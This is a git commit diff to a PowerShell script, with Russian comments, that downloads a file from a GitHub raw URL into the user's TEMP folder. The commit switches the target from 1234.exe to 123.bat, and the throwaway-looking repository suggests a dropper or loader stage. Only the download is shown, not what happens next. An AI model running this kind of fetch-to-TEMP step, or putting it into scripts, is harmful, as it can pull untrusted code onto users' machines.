4c58d3d3144b498a1abb4484da373756799e4fec
asakwaza <138608687+asakwaza@users.noreply.github.com>
2026-06-15 17:46:48 +0300

    Add files via upload

--- 1234.ps1
+++ 1234.ps1
@@ -1,6 +1,6 @@
 # Указываем URL и путь к сохранению
-$url = "https://github.com/asakwaza/HHIHIASHDI1test/raw/refs/heads/main/1234.exe"
-$output = "$env:TEMP\1234.exe"
+$url = "https://github.com/asakwaza/HHIHIASHDI1test/raw/refs/heads/main/123.bat"
+$output = "$env:TEMP\123.bat"
 
 # Скачиваем файл
 Invoke-WebRequest -Uri $url -OutFile $output
